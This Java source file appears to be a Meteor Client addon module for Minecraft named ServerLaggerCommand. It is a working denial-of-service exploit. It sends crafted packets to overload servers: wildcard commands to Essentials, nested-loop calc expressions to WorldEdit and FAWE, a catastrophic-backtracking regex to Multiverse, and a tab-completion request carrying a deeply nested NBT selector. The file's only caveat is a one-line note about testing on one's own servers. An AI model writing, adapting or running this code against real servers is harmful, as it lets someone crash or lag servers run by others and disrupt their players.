package com.codigohasta.addon.modules;

import com.codigohasta.addon.AddonTemplate;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent.Pre;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.EnumSetting.Builder;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

public class ServerLaggerCommand extends Module {
   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
   private final Setting<ServerLaggerCommand.Mode> mode = this.sgGeneral
      .add(
         ((Builder)((Builder)((Builder)new Builder().name("mode")).description("Which server-plugin command exploit to use."))
               .defaultValue(ServerLaggerCommand.Mode.Selector))
            .build()
      );
   private final Setting<Integer> commandPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("count"))
                     .description("Number of tab-complete requests for the selector mode."))
                  .defaultValue(3))
               .min(1)
               .max(5)
               .sliderMin(1)
               .sliderMax(5)
               .visible(() -> this.mode.get() == ServerLaggerCommand.Mode.Selector))
            .build()
      );
   private final Setting<Integer> length = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("length"))
                     .description("Overflow length for the selector mode."))
                  .defaultValue(2032))
               .min(1000)
               .max(3000)
               .sliderMin(1000)
               .sliderMax(3000)
               .visible(() -> this.mode.get() == ServerLaggerCommand.Mode.Selector))
            .build()
      );
   private final Setting<Boolean> autoDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("auto-disable"))
                  .description("Disable the module when you join or leave a world."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Boolean> smartDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("smart-disable"))
                  .description("Automatically disable the module when a mode finishes or errors out."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Integer> delay = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                     .name("delay"))
                  .description("Ticks to wait between bursts of packets."))
               .defaultValue(1))
            .min(0)
            .max(100)
            .sliderMin(0)
            .sliderMax(100)
            .build()
      );
   private int ticks = 0;

   public ServerLaggerCommand() {
      super(
         AddonTemplate.OP_CATEGORY,
         "ServerLaggerCommand",
         "Spams vulnerable plugin commands (Essentials / FAWE / WorldEdit / Multiverse) or tab-completion overflows. Testing on your own / LAN servers only."
      );
   }

   @EventHandler
   private void onTick(Pre event) {
      if (this.mc.player != null && this.mc.world != null) {
         this.ticks++;
         if (this.ticks > (Integer)this.delay.get()) {
            this.ticks = 0;
            switch ((ServerLaggerCommand.Mode)this.mode.get()) {
               case Essentials:
                  this.mc.getNetworkHandler().sendPacket(new CommandExecutionC2SPacket("pay * a a"));
                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case Promote:
                  this.mc.getNetworkHandler().sendPacket(new CommandExecutionC2SPacket("promote * a"));
                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case FaweWorldEdit:
                  this.mc
                     .getNetworkHandler()
                     .sendPacket(new CommandExecutionC2SPacket("to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case WorldEdit:
                  this.mc
                     .getNetworkHandler()
                     .sendPacket(new CommandExecutionC2SPacket("calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}"));
                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case MultiverseCore:
                  this.mc.getNetworkHandler().sendPacket(new CommandExecutionC2SPacket("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"));
                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case MultiverseCoreNew:
                  this.mc.getNetworkHandler().sendPacket(new CommandExecutionC2SPacket("mv __REDACTED__"));
                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case Selector:
                  String overflow = this.generateJsonObject((Integer)this.length.get());
                  String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);

                  for (int i = 0; i < this.commandPackets.get(); i++) {
                     this.mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                  }

                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
            }
         }
      } else {
         if ((Boolean)this.autoDisable.get()) {
            this.disable();
         }
      }
   }

   @EventHandler
   private void onGameJoined(GameJoinedEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   @EventHandler
   private void onGameLeft(GameLeftEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   private String generateJsonObject(int levels) {
      String json = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
      return "{a:" + json + "}";
   }

   public void onDeactivate() {
      this.ticks = 999;
   }

   public static enum Mode {
      Essentials,
      Promote,
      FaweWorldEdit,
      WorldEdit,
      MultiverseCore,
      MultiverseCoreNew,
      Selector;
   }
}
